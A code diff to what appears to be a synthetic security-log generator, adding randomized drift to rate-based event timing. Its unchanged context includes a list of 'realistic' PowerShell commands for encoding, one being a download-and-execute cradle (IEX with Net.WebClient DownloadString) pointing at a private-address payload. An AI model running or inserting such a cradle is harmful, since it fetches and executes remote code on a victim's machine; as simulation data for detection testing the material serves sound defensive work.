@@ -134,6 +134,19 @@ def _iter_periodic_ticks(
         t += interval_sec
 
 
+def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
+    """Return interval for rate-based bulk events.
+
+    Explicit count-based events stay exact. Duration/end-time based events treat
+    rate as an average throughput and apply deterministic per-campaign drift so
+    repeated scans with the same nominal rate do not produce identical counts.
+    """
+    effective_rate = rate
+    if count is None:
+        effective_rate *= rng.uniform(0.82, 1.18)
+    return 1.0 / effective_rate
+
+
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1421,7 +1434,6 @@ class StorylineMixin:
 
             # Timing: rate-based → convert to interval
             start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
-            interval_sec = 1.0 / spec.rate
             duration_sec = None
             count = spec.count
             if spec.duration is not None:
@@ -1429,6 +1441,7 @@ class StorylineMixin:
             elif spec.end_time is not None:
                 end_dt = self._parse_storyline_time(spec.end_time)
                 duration_sec = (end_dt - start).total_seconds()
+            interval_sec = _effective_rate_interval(spec.rate, count, rng)
 
             scan_src_ip = spec.source_ip or system.ip
             scan_host = spec.hostname or spec.dst_ip
